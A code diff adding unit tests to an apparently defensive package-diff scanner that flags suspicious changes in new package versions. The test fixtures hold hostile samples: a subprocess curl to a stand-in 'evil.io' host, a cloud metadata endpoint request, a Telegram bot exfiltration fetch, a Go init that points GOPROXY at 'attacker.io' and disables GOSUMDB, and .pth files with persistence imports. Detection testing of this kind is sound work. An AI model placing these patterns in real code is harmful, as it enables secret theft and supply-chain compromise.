@@ -30,6 +30,8 @@ from activities.package_diff import (
     _added_lines_have_net_calls,
     _build_diff,
     _cargo_git_deps_added,
+    _composer_autoload_files_added,
+    _composer_plugin_type_added,
     _diff_added_lines,
     _extract_and_diff,
     _get_file_map,
@@ -38,7 +40,7 @@ from activities.package_diff import (
     _is_noise,
     _npm_git_url_deps_added,
     _pip_git_url_deps_added,
-    _composer_autoload_files_added,
+    _pth_has_executable_code,
     compute,
 )
 from tests.helpers import make_tar_gz as _make_tar_gz, make_zip as _make_zip
@@ -1732,3 +1734,185 @@ def test_build_diff_flags_cargo_git_dep(tmp_path):
     )
     _, _, _, _, _, _, git_url_dep, _ = _build_diff(old, new)
     assert git_url_dep is True
+
+
+# ---------------------------------------------------------------------------
+# subprocess execution in Python library code
+# ---------------------------------------------------------------------------
+
+
+def test_net_calls_detected_subprocess_in_python(tmp_path):
+    """subprocess.run in a .py lib file sets network_calls_in_lib (import-time exec pattern)."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {"mylib/_client.py": "import subprocess\nsubprocess.run(['curl', 'https://evil.io'])\n"},
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_added_lines_have_net_calls_subprocess():
+    assert _added_lines_have_net_calls(["subprocess.Popen(['bash', '-c', cmd])"], ".py") is True
+    assert _added_lines_have_net_calls(["subprocess.check_output(['id'])"], ".py") is True
+    assert _added_lines_have_net_calls(["result = compute(x)"], ".py") is False
+
+
+# ---------------------------------------------------------------------------
+# Hardcoded IMDS / Telegram C2 endpoint detection
+# ---------------------------------------------------------------------------
+
+
+def test_net_calls_detected_imds_in_python(tmp_path):
+    """Hardcoded 169.254.169.254 in Python library code sets network_calls_in_lib."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {"mylib/config.py": 'import urllib\nurl = "http://169.254.169.254/latest/meta-data/"\n'},
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_net_calls_detected_telegram_in_js(tmp_path):
+    """api.telegram.org/bot in a .js file sets network_calls_in_lib."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {"lib/exfil.js": "fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, opts);\n"},
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_added_lines_have_net_calls_imds_python():
+    assert (
+        _added_lines_have_net_calls(["requests.get('http://169.254.169.254/latest/')"], ".py")
+        is True
+    )
+
+
+def test_added_lines_have_net_calls_telegram_js():
+    assert (
+        _added_lines_have_net_calls(
+            ["fetch('https://api.telegram.org/bot123/sendMessage', {})"], ".js"
+        )
+        is True
+    )
+
+
+# ---------------------------------------------------------------------------
+# Go GOPROXY / GOSUMDB tampering
+# ---------------------------------------------------------------------------
+
+
+def test_net_calls_detected_goproxy_tampering(tmp_path):
+    """os.Setenv(\"GOPROXY\") in a .go file sets network_calls_in_lib."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "internal/setup.go": 'package main\nimport "os"\nfunc init() { os.Setenv("GOPROXY", "https://attacker.io") }\n'
+        },
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_added_lines_have_net_calls_gosumdb():
+    assert _added_lines_have_net_calls(['os.Setenv("GOSUMDB", "off")'], ".go") is True
+
+
+# ---------------------------------------------------------------------------
+# .pth file executable code detection (CanisterWorm persistence pattern)
+# ---------------------------------------------------------------------------
+
+
+def test_pth_has_executable_code_import_line(tmp_path):
+    """.pth file with import statement is flagged."""
+    f = tmp_path / "evil.pth"
+    f.write_text("/some/path\nimport malicious_module\n")
+    assert _pth_has_executable_code(f) is True
+
+
+def test_pth_has_executable_code_path_only(tmp_path):
+    """.pth file with only path entries is not flagged."""
+    f = tmp_path / "legit.pth"
+    f.write_text("/usr/lib/python3/dist-packages\n../src\n")
+    assert _pth_has_executable_code(f) is False
+
+
+def test_build_diff_pth_install_hook_new_file(tmp_path):
+    """A new .pth file with import line sets install_script_added."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {"easy-install.pth": "/some/path\nimport _evil_persistence\n"},
+    )
+    _, install_added, _, *_ = _build_diff(old, new)
+    assert install_added is True
+
+
+def test_build_diff_pth_changed_gains_import(tmp_path):
+    """An existing .pth file that gains an import line sets install_script_changed."""
+    old = _write_files(tmp_path / "old", {"easy-install.pth": "/some/path\n"})
+    new = _write_files(
+        tmp_path / "new",
+        {"easy-install.pth": "/some/path\nimport _evil_persistence\n"},
+    )
+    _, _, install_changed, *_ = _build_diff(old, new)
+    assert install_changed is True
+
+
+def test_build_diff_pth_path_only_not_flagged(tmp_path):
+    """A new .pth file with only path entries is NOT flagged."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(tmp_path / "new", {"easy-install.pth": "/usr/lib/python3/dist-packages\n"})
+    _, install_added, install_changed, *_ = _build_diff(old, new)
+    assert install_added is False
+    assert install_changed is False
+
+
+# ---------------------------------------------------------------------------
+# Composer plugin type detection
+# ---------------------------------------------------------------------------
+
+
+def test_composer_plugin_type_added(tmp_path):
+    """composer.json changing type to 'composer-plugin' is flagged."""
+    old = tmp_path / "old.json"
+    new = tmp_path / "new.json"
+    old.write_text('{"name": "vendor/pkg", "type": "library"}')
+    new.write_text(
+        '{"name": "vendor/pkg", "type": "composer-plugin", "extra": {"class": "Vendor\\\\Plugin"}}'
+    )
+    assert _composer_plugin_type_added(old, new) is True
+
+
+def test_composer_plugin_type_unchanged_not_flagged(tmp_path):
+    """composer.json that was already a plugin is not re-flagged."""
+    old = tmp_path / "old.json"
+    new = tmp_path / "new.json"
+    old.write_text('{"type": "composer-plugin"}')
+    new.write_text('{"type": "composer-plugin", "version": "2.0.0"}')
+    assert _composer_plugin_type_added(old, new) is False
+
+
+def test_composer_library_type_not_flagged(tmp_path):
+    """Normal library type change is not flagged."""
+    old = tmp_path / "old.json"
+    new = tmp_path / "new.json"
+    old.write_text('{"type": "library"}')
+    new.write_text('{"type": "library", "version": "2.0.0"}')
+    assert _composer_plugin_type_added(old, new) is False
+
+
+def test_build_diff_composer_plugin_type_sets_install_added(tmp_path):
+    """_build_diff sets install_script_added when composer.json becomes a plugin."""
+    old = _write_files(tmp_path / "old", {"composer.json": '{"type": "library"}'})
+    new = _write_files(
+        tmp_path / "new",
+        {"composer.json": '{"type": "composer-plugin", "extra": {"class": "Vendor\\\\Plugin"}}'},
+    )
+    _, install_added, _, *_ = _build_diff(old, new)
+    assert install_added is True
